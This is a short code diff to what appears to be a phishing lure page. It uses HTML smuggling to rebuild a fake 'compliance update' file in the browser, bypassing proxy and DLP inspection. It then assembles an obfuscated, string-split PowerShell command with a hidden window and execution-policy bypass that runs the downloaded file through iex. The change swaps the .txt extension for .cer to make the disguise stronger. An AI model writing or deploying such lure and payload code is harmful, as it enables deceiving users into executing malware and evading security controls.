@@ -261,7 +261,7 @@
     }
 
     // T1027.006 - HTML Smuggling: the compliance file is reconstructed client-side
-    // from an embedded base64 blob. No HTTP request is issued for the .txt itself,
+    // from an embedded base64 blob. No HTTP request is issued for the .cer itself,
     // so proxy/DLP controls that inspect file downloads by name or MIME type are bypassed.
     function triggerDownload() {
         var b64 = '@@TXT_B64@@';
@@ -283,7 +283,7 @@
     function buildCommand() {
         var ps  = ['pow','er','sh','ell'].join('');
         var sw  = [' -w',' h',' -ep',' byp','ass',' -c'].join('');
-        var pay = ["\"iex(gc -Raw '","%" + "USERPROFILE","%" + "\\Down","loads\\","Essos_","Compli","ance_Up","date.txt",'\')"'].join('');
+        var pay = ["\"iex(gc -Raw '","%" + "USERPROFILE","%" + "\\Down","loads\\","Essos_","Compli","ance_Up","date.cer",'\')"'].join('');
         return ps + sw + ' ' + pay;
     }
 
